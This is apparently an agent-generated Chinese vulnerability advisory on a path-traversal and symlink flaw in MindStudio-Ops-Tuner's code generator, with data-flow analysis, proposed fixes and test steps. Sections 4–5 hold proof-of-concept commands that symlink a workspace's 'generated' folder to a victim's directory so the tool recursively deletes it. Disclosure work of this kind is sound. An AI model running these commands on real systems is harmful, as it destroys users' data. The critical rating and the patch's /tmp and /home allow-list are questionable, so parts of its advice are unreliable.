# VULN-CODEGEN-TAINT-001：Manifest.generate_code路径遍历致任意目录删除风险

**漏洞ID**: VULN-CODEGEN-TAINT-001  
**漏洞类型**: Path Traversal (路径遍历)  
**CWE**: CWE-22 - Improper Limitation of a Pathname to a Restricted Directory  
**严重性**: Critical  
**置信度**: 95  

---

## 1. 漏洞概述

### 1.1 基本信息

| 项目属性 | 值 |
|---------|-----|
| 漏洞文件 | `library/scripts/manifest.py` |
| 漏洞行号 | 134-147 |
| 漏洞函数 | `Manifest.generate_code()` |
| 影响模块 | `code_generator` |

### 1.2 影响范围和业务风险

**影响范围**：
- 该漏洞存在于 MindStudio-Ops-Tuner 的代码生成模块
- 影响 `manifest.py` 中的 `generate_code()` 函数
- 该函数被 `code_generator.py` 的 CLI 入口调用

**业务风险**：
1. **数据丢失风险**：攻击者可指定任意目录作为 workspace-dir，导致该目录及其子目录被完全删除
2. **系统破坏风险**：可删除系统关键目录（如 `/etc`, `/usr/local`, `/opt`）中的内容
3. **权限提升风险**：在多用户环境下，可删除其他用户的敏感数据
4. **拒绝服务风险**：删除关键系统目录可能导致系统无法正常运行

**攻击场景示例**：
- 删除 `/home/user/Documents` 目录导致用户数据永久丢失
- 删除 `/var/log` 目录导致审计日志丢失
- 在容器环境中删除挂载的宿主机目录

---

## 2. 根因分析

### 2.1 代码层面的问题根源

**核心问题**：CLI 参数 `--workspace-dir` 直接传递给文件系统操作函数，缺乏安全验证。

**具体问题点**：

1. **无路径验证**：第 135-136 行直接使用 CLI 参数构建路径
   ```python
   workspace_dir = self.args.workspace_dir  # 直接来自用户输入
   generated_dir = os.path.join(workspace_dir, 'generated')
   ```

2. **无边界检查**：未检查路径是否超出预期范围
   - 未验证路径是否包含 `..`（父目录引用）
   - 未验证路径是否指向敏感目录
   - 未验证路径是否为绝对路径或相对路径

3. **危险操作无保护**：第 143 和 147 行执行高危操作
   ```python
   shutil.rmtree(generated_dir)  # 递归删除，无保护
   os.mkdir(generated_dir)       # 创建目录，无保护
   ```

### 2.2 为什么存在这个漏洞

**设计缺陷**：
- 代码生成器设计为内部工具，默认信任调用者
- 缺乏安全边界思维，未考虑恶意用户场景
- 假设调用者会提供安全的工作目录路径

**缺少的安全机制**：
- 路径白名单/黑名单验证
- 路径规范化后的边界检查
- 危险操作的二次确认机制

---

## 3. 完整数据流路径

### 3.1 数据流追踪图

```
[SOURCE] CLI 参数 --workspace-dir
    │
    │  命令行输入（用户完全可控）
    │
    ▼
code_generator.py:50
    │  parser.parse_args()
    │  → args.workspace_dir
    │
    ▼
code_generator.py:56
    │  Manifest(args)
    │  → self.args = args
    │
    ▼
manifest.py:48-53 (Manifest.__init__)
    │  self.args = args  # 存储未验证的参数
    │  self.filtered_kernels = [args.kernels]
    │
    ▼
manifest.py:134 (generate_code)
    │  workspace_dir = self.args.workspace_dir
    │  generated_dir = os.path.join(workspace_dir, 'generated')
    │
    ▼
[SINK-1] manifest.py:143
    │  shutil.rmtree(generated_dir)
    │  → 递归删除任意目录及其内容
    │
[SINK-2] manifest.py:147
    │  os.mkdir(generated_dir)
    │  → 在任意位置创建目录
```

### 3.2 传播节点详解

| 节点 | 文件 | 行号 | 函数 | 数据状态 | 验证状态 |
|------|------|------|------|----------|----------|
| 入口 | code_generator.py | 38-41 | argparse.ArgumentParser.add_argument | 用户输入 | 未验证 |
| 解析 | code_generator.py | 50 | parse_args() | args.workspace_dir | 未验证 |
| 存储 | manifest.py | 49 | Manifest.__init__ | self.args.workspace_dir | 未验证 |
| 构建 | manifest.py | 135-136 | generate_code | generated_dir | 未验证 |
| 删除 | manifest.py | 143 | generate_code | shutil.rmtree参数 | **危险操作** |
| 创建 | manifest.py | 147 | generate_code | os.mkdir参数 | **危险操作** |

---

## 4. 利用场景分析

### 4.1 攻击者如何触发漏洞

**触发方式**：通过 CLI 参数 `--workspace-dir` 指定恶意路径

**前提条件**：
1. 攻击者有权限执行 `code_generator.py`
2. 目标目录存在或有权限创建（对于符号链接攻击）
3. 攻击者有删除目标目录的权限（取决于运行用户）

### 4.2 具体攻击命令/PoC示例

**场景1：删除用户敏感目录**

```bash
# 攻击命令
python3 library/scripts/code_generator.py \
    --workspace-dir /home/user/Documents \
    --kernels "00_basic_matmul"

# 结果：/home/user/Documents/generated 目录被删除
# 如果 Documents 下已有 generated 子目录，其内容将被完全删除
```

**场景2：路径遍历攻击**

```bash
# 攻击命令（使用 .. 跳出预期目录）
python3 library/scripts/code_generator.py \
    --workspace-dir "/tmp/workspace/../.." \
    --kernels "00_basic_matmul"

# 结果：尝试在根目录创建 /generated 目录
# 如果根目录有 generated 目录，会被删除
```

**场景3：删除系统关键目录**

```bash
# 攻击命令（需要 root 权限运行）
python3 library/scripts/code_generator.py \
    --workspace-dir /usr/local \
    --kernels "00_basic_matmul"

# 结果：/usr/local/generated 目录被删除
# 可能破坏已安装的软件
```

**场景4：组合符号链接攻击（与 VULN-CODEGEN-TAINT-002 协同）**

```bash
# 步骤1：创建恶意符号链接
mkdir -p /tmp/attack_workspace
ln -s /home/victim/Documents /tmp/attack_workspace/generated

# 步骤2：触发漏洞
python3 library/scripts/code_generator.py \
    --workspace-dir /tmp/attack_workspace \
    --kernels "00_basic_matmul"

# 结果：/home/victim/Documents 整个目录被删除（见 VULN-002 分析）
```

### 4.3 可能的影响

**直接影响**：
- 数据永久丢失（shutil.rmtree 递归删除）
- 文件系统结构破坏
- 系统服务中断

**间接影响**：
- 用户信任度下降
- 审计日志丢失（如果删除 /var/log）
- 合规性问题（数据保护法规）

---

## 5. PoC 构造步骤

### 5.1 详细重现步骤

**环境准备**：

```bash
# 1. 克隆或下载 MindStudio-Ops-Tuner 项目
cd /path/to/MindStudio-Ops-Tuner

# 2. 创建测试环境
mkdir -p /tmp/victim_data
echo "important data" > /tmp/victim_data/important_file.txt
echo "another file" > /tmp/victim_data/another_file.txt

# 3. 创建符号链接攻击场景
mkdir -p /tmp/attack_workspace
ln -s /tmp/victim_data /tmp/attack_workspace/generated
```

**触发攻击**：

```bash
# 4. 执行代码生成器（指定恶意 workspace-dir）
python3 library/scripts/code_generator.py \
    --workspace-dir /tmp/attack_workspace \
    --kernels "00_basic_matmul" \
    --arch AtlasA2

# 5. 验证攻击结果
ls /tmp/victim_data  # 应该返回空或不存在
cat /tmp/victim_data/important_file.txt  # 应该返回错误
```

### 5.2 需要的环境和前提条件

**必要条件**：
- Python 3.x 环境
- MindStudio-Ops-Tuner 项目源码
- 执行权限（取决于目标目录的权限）

**可选条件**：
- 多用户 Linux 系统环境（用于跨用户攻击演示）
- 容器环境（用于挂载目录攻击演示）

---

## 6. 修复建议

### 6.1 具体的代码修复方案

**方案1：添加路径白名单验证**

```python
# 在 Manifest.__init__ 中添加验证
import os
import os.path

ALLOWED_WORKSPACE_BASE_DIRS = [
    '/tmp',
    '/home',  # 可根据实际需求配置
    '/workspace',
    os.getcwd()  # 当前工作目录
]

def validate_workspace_dir(workspace_dir):
    """验证 workspace 目录路径安全性"""
    # 1. 规范化路径
    normalized_path = os.path.normpath(os.path.abspath(workspace_dir))
    
    # 2. 检查是否在允许的基目录范围内
    is_allowed = False
    for allowed_base in ALLOWED_WORKSPACE_BASE_DIRS:
        allowed_base_norm = os.path.normpath(os.path.abspath(allowed_base))
        if normalized_path.startswith(allowed_base_norm + os.sep):
            is_allowed = True
            break
    
    if not is_allowed:
        raise ValueError(
            f"workspace_dir '{workspace_dir}' is not in allowed directories. "
            f"Allowed base directories: {ALLOWED_WORKSPACE_BASE_DIRS}"
        )
    
    # 3. 检查是否包含路径遍历字符
    if '..' in workspace_dir:
        raise ValueError(
            f"workspace_dir '{workspace_dir}' contains path traversal characters"
        )
    
    # 4. 检查是否为符号链接（见 VULN-002 修复）
    if os.path.exists(normalized_path) and os.path.islink(normalized_path):
        raise ValueError(
            f"workspace_dir '{workspace_dir}' is a symbolic link, which is not allowed"
        )
    
    return normalized_path
```

**方案2：修改 generate_code 函数**

```python
def generate_code(self):
    # 在使用前验证 workspace_dir
    workspace_dir = self.validate_workspace_dir(self.args.workspace_dir)
    generated_dir = os.path.join(workspace_dir, 'generated')
    
    # ... 后续代码
    
    if os.path.exists(generated_dir):
        # 检查符号链接（见 VULN-002 修复）
        if os.path.islink(generated_dir):
            raise SecurityError(
                f"generated directory '{generated_dir}' is a symbolic link. "
                f"Operation aborted for security reasons."
            )
        
        # 添加二次确认机制（可选）
        LOGGER.warning(f"About to remove existing directory: {generated_dir}")
        shutil.rmtree(generated_dir)
    
    os.mkdir(generated_dir)
    # ... 后续代码
```

### 6.2 安全最佳实践建议

1. **最小权限原则**：
   - 限制程序运行用户的权限
   - 使用专用用户账户运行代码生成器

2. **输入验证**：
   - 所有用户输入必须经过验证
   - 使用白名单而非黑名单

3. **路径规范化**：
   - 使用 `os.path.abspath()` 和 `os.path.normpath()`
   - 检查规范化后的路径是否在预期范围内

4. **危险操作保护**：
   - `shutil.rmtree` 等危险操作需要二次确认
   - 记录所有危险操作的审计日志

5. **符号链接检测**：
   - 检查所有路径是否为符号链接
   - 拒绝对符号链接执行删除操作

### 6.3 修复后的验证方法

**验证步骤**：

```bash
# 1. 测试路径遍历防护
python3 library/scripts/code_generator.py \
    --workspace-dir "/tmp/../etc" \
    --kernels "00_basic_matmul"

# 预期：抛出 ValueError，拒绝执行

# 2. 测试敏感目录防护
python3 library/scripts/code_generator.py \
    --workspace-dir "/usr" \
    --kernels "00_basic_matmul"

# 预期：抛出 ValueError，拒绝执行

# 3. 测试符号链接防护
mkdir -p /tmp/test
ln -s /home /tmp/test/generated
python3 library/scripts/code_generator.py \
    --workspace-dir /tmp/test \
    --kernels "00_basic_matmul"

# 预期：抛出 SecurityError，拒绝删除符号链接

# 4. 测试正常场景
python3 library/scripts/code_generator.py \
    --workspace-dir /tmp/normal_workspace \
    --kernels "00_basic_matmul"

# 预期：正常执行，生成代码
```

---

## 7. 相关代码片段

### 7.1 漏洞点代码（带行号）

**manifest.py 第 134-147 行**：

```python
134: def generate_code(self):
135:     workspace_dir = self.args.workspace_dir  # ← 未验证的用户输入
136:     generated_dir = os.path.join(workspace_dir, 'generated')
137: 
138:     LOGGER.debug(f'generated_dir={generated_dir}')
139: 
140:     if os.path.exists(generated_dir):
141:         if os.path.islink(generated_dir):
142:             LOGGER.warning(f'generated directory is a soft link, which is not recommended...')  # ← 仅警告
143:         shutil.rmtree(generated_dir)  # ← SINK: 递归删除任意目录
144:     else:
145:         pass
146: 
147:     os.mkdir(generated_dir)  # ← SINK: 创建任意目录
```

### 7.2 相关上下文代码

**code_generator.py CLI 入口**：

```python
# 第 38-41 行：参数定义
parser.add_argument(
    '--workspace-dir',
    type=str,
    help="Workspace directory",  # ← 无安全约束
)

# 第 50-57 行：参数传递
args = parser.parse_args()
LOGGER.debug(f'args.workspace_dir={args.workspace_dir}')
manifest = Manifest(args)  # ← 直接传递未验证参数
manifest.generate_code()
```

**manifest.py 初始化**：

```python
# 第 48-53 行
def __init__(self, args):
    self.args = args  # ← 直接存储未验证参数
    self.operations = []
    self.operations_dict = {}
    self.enable_filter_out = True
    self.filtered_kernels = [args.kernels]
```

---

## 8. 参考资料

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Python shutil.rmtree Security Considerations](https://docs.python.org/3/library/shutil.html#shutil.rmtree)
- [Secure File Operations in Python](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

---

## 9. 附录

### 9.1 漏洞发现方法

- **发现方式**: DataFlow Scanner 静态污点追踪
- **分析工具**: Python 污点追踪规则
- **置信度评分**: 95 (详见 verification 结果)

### 9.2 相关漏洞

- **VULN-CODEGEN-TAINT-002**: Symlink Attack (同一文件，协同利用)
- 两个漏洞可组合使用，增强攻击效果

---

**报告生成时间**: 2026-04-21  
**分析者**: details-analyzer Agent